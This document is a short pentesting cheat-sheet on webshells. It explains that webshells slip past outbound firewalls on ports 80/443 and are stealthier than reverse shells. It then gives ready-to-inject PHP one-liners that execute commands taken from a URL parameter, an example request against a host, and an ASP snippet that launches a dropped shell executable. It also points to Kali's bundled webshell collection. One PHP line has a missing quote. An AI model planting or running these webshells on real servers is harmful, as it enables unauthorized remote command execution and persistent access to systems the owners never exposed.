# Webshell

A webshell is a shell that you can access through the web. This is useful for when you have firewalls that filter outgoing traffic on ports other than port 80. As long as you have a webserver, and want it to function, you can't filter our traffic on port 80 (and 443). It is also a bit more stalthy than a reverse shell on other ports since the traffic is hidden in the http traffic.

## PHP - Basic cmd-shell

This code can be injected into pages that use php.
```

# Execute one command
<?php system("whoami); ?>

# Take input from the url paramter. shell.php?cmd=whoami
<?php system($_GET['cmd']); ?>

# The same but using passthru
<?php passthru($_GET['cmd']); ?>

# For shell_exec to output the result you need to echo it
<?php echo shell_exec("whoami");?>

# Exec() does not output the result without echo, and only output the last line. So not very useful!
<?php echo exec("whoami");?>

# Instead to this if you can
<?php exec("ls -la",$array); print_r($array); ?>

The exec() function accepts a command as a parameter but does not output the result. If second optional parameter is specified, the result will be returned as an array. Otherwise, only the last line of the result will be shown if echoed.
```

You can then call then execute the commands like this:

```
http://192.168.1.103/index.php?cmd=pwd
```

## ASP

```
<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /c c:\Inetpub\shell443.exe",0,True)
%>
```

## Webshells

Wellshells have the benefit of running on port 80/443. Which makes it a bit more stealthy, it doesn't create a new connection that can be discovered. But on the other hand it creates a lot of strange logs that can be easy to detect.

You have access to different kinds of webshells on Kali here:
```
/usr/share/webshells
```

http://www.binarytides.com/web-shells-tutorial/
